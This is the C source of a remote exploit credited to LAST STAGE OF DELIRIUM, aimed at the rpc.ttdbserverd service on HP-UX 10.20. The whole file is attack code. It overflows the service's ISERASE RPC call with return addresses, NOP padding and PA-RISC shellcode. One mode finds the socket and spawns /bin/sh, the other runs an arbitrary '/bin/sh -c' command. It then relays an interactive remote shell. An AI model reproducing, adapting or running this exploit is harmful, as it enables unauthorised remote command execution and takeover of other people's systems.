/*## copyright LAST STAGE OF DELIRIUM jul 1998 poland        *://lsd-pl.net/ #*/
/*## rpc.ttdbserverd                                                         #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

#define ADRNUM 2000
#define NOPNUM 18000

#define TTDBSERVERD_PROG 100083
#define TTDBSERVERD_VERS 1
#define TTDBSERVERD_ISERASE 7

char findsckcode[]=
    "\xe9\x9f\x1f\xfd"    /* bl        .+4,%r12                  */
    "\x0b\x18\x02\x98"    /* xor       %r24,%r24,%r24            */
    "\xb4\x0e\x01\xde"    /* addi      0xef,%r0,%r14             */
    "\xb5\x98\x07\xd3"    /* addi     -0x17,%r12,%r24            */
    "\xb5\x99\x07\xdb"    /* addi     -0x13,%r12,%r25            */
    "\x08\x0e\x06\x1a"    /* add       %r14,%r0,%r26             */
    "\x20\x20\x08\x01"    /* ldil      L%0xc0000004,%r1          */
    "\xe4\x20\xe0\x08"    /* ble       R%0xc0000004(%sr7,%r1)    */
    "\xb4\x16\x02\x2c"    /* addi      0x116,%r0,%r22            */
    "\x80\x1c\x20\x20"    /* comb,=    %ret0,%r0,.+24            */
    "\x0b\x18\x02\x98"    /* xor       %r24,%r24,%r24            */
    "\xb5\xce\x07\xff"    /* addi      -0x1,%r14,%r14            */
    "\x88\x0e\x3f\xad"    /* combf,=   %r14,%r0,.-36             */
    "\x0b\x18\x02\x98"    /* xor       %r24,%r24,%r24            */
    "\x61\x61\x12\x34"    /*                                     */
    "\xb5\x99\x06\x3f"    /* addi      -0xe1,%r12,%r25           */
    "\x47\x2f\x02\x20"    /* ldh       0x110(%r25),%r15          */
    "\x45\x90\x3f\xdf"    /* ldh       -0x11(%r12),%r16          */
    "\x82\x0f\x20\x10"    /* comb,=    %r15,%r16,.+16            */
    "\x0b\x18\x02\x98"    /* xor       %r24,%r24,%r24            */
    "\x8a\x0f\x3f\x6d"    /* combf,=   %r15,%r16,.-68            */
    "\xb5\xce\x07\xff"    /* addi      -0x1,%r14,%r14            */
    "\xb4\x0f\x40\x04"    /* addi,<    0x2,%r0,%r15              */
    "\x08\x0e\x06\x1a"    /* add       %r14,%r0,%r26             */
    "\x08\x0f\x06\x19"    /* add       %r15,%r0,%r25             */
    "\x20\x20\x08\x01"    /* ldil      L%0xc0000004,%r1          */
    "\xe4\x20\xe0\x08"    /* ble       R%0xc0000004(%sr7,%r1)    */ 
    "\xb4\x16\x70\xb4"    /* addi,>    0x5a,%r0,%r22             */
    "\x88\x0f\x3f\xcd"    /* combf,=   %r15,%r0,.-20             */
    "\xb5\xef\x07\xff"    /* addi      -0x1,%r15,%r15            */
;

char shellcode[]=
    "\xeb\x5f\x1f\xfd"    /* bl     .+4,%r26                     */
    "\x0b\x39\x02\x99"    /* xor    %r25,%r25,%r25               */
    "\xb7\x5a\x40\x22"    /* addi,< 0x11,%r26,%r26               */
    "\x0f\x40\x12\x0e"    /* stbs   %r0,7(%r26)                  */
    "\x20\x20\x08\x01"    /* ldil   L%0xc0000004,%r1             */
    "\xe4\x20\xe0\x08"    /* ble    R%0xc0000004(%sr7,%r1)       */
    "\xb4\x16\x70\x16"    /* addi,> 0xb,%r0,%r22                 */
    "/bin/sh"
;

char cmdshellcode[]=
    "\xeb\x5f\x1f\xfd"    /* bl        .+4,%r26                  */
    "\x20\x20\x08\x01"    /* ldil      L%0xc0000004,%r1          */
    "\xb7\x5a\x40\x5a"    /* addi,<    0x2d,%r26,%r26            */
    "\xb7\x56\x40\x10"    /* addi,<    0x8,%r26,%r22             */
    "\xb7\x55\x40\x18"    /* addi,<    0xc,%r26,%r21             */
    "\x0f\x40\x12\x0e"    /* stbs      %r0,0x7(%r26)             */
    "\x0f\x40\x12\x14"    /* stbs      %r0,0xa(%r26)             */
    "\x6b\x5a\x3f\x99"    /* stw       %r26,-0x34(%r26)          */
    "\x6b\x56\x3f\xa1"    /* stw       %r22,-0x30(%r26)          */
    "\x6b\x55\x3f\xa9"    /* stw       %r21,-0x2c(%r26)          */
    "\x6b\x40\x3f\xb1"    /* stw       %r0, -0x28(%r26)          */
    "\xb7\x59\x47\x99"    /* addi,<    -0x34,%r26,%r25           */
    "\xe4\x20\xe0\x08"    /* ble       R%0xc0000004(%sr7,%r1)    */
    "\xb4\x16\x70\x16"    /* addi,>    0x0b,%r0,%r22             */
    "/bin/sh "
    "-c  "
;

static char nop[]="\x0a\xb5\x02\x95"; 

typedef struct{char *string;}req_t;

bool_t xdr_req(XDR *xdrs,req_t *obj){
    if(!xdr_string(xdrs,&obj->string,~0)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[30000],address[4],*b,*cmd;
    int i,c,n,flag=1,vers=6,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf("copyright LAST STAGE OF DELIRIUM jul 1998 poland  //lsd-pl.net/\n");
    printf("rpc.ttdbserverd for HP-UX 10.20\n");

    if(argc<2){
        printf("usage: %s address [-s|-c command] [-p port] \n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"sc:p:v:"))!=-1){
        switch(c){
        case 's': flag=1;break;
        case 'c': flag=0;cmd=optarg;break;
        case 'p': port=atoi(optarg);break;
        case 'v': vers=atoi(optarg);
        }
    }

    *(unsigned long*)address=htonl(0x7b03e8b0);

    printf("adr=0x%08x timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,TTDBSERVERD_PROG,TTDBSERVERD_VERS,&sck,0,0))){
        clnt_pcreateerror("error");exit(-1);
    }

    b=buffer;
    for(i=0;i<ADRNUM;i++) *b++=address[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    if(flag){
        i=sizeof(struct sockaddr_in);
        if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
            struct netbuf {unsigned int maxlen;unsigned int len;char *buf;};
            struct netbuf nb;
            ioctl(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);;
            nb.buf=(char*)&adr;
            ioctl(sck,(('T'<<8)|144),&nb);
        }
        n=ntohs(adr.sin_port);
        printf("port=%d connected! ",n);fflush(stdout);

        findsckcode[58]=(unsigned char)((n&0xff00)>>8);
        findsckcode[59]=(unsigned char)(n&0xff);
        for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
        for(i=0;i<4;i++) *b++=nop[i%4];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    }else{
        printf("connected! ");fflush(stdout);
        for(i=0;i<strlen(cmdshellcode);i++) *b++=cmdshellcode[i];
        for(i=0;i<4;i++) *b++=' ';
        for(i=0;i<strlen(cmd);i++) *b++=cmd[i];
    }
    *b=0;

    req.string=buffer;
    cl->cl_auth=authunix_create("localhost",0,0,0,NULL);
    stat=clnt_call(cl,TTDBSERVERD_ISERASE,xdr_req,(char*)&req,xdr_void,NULL,tm);
    printf("sent!\n");
    if(!flag) exit(0);

    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}

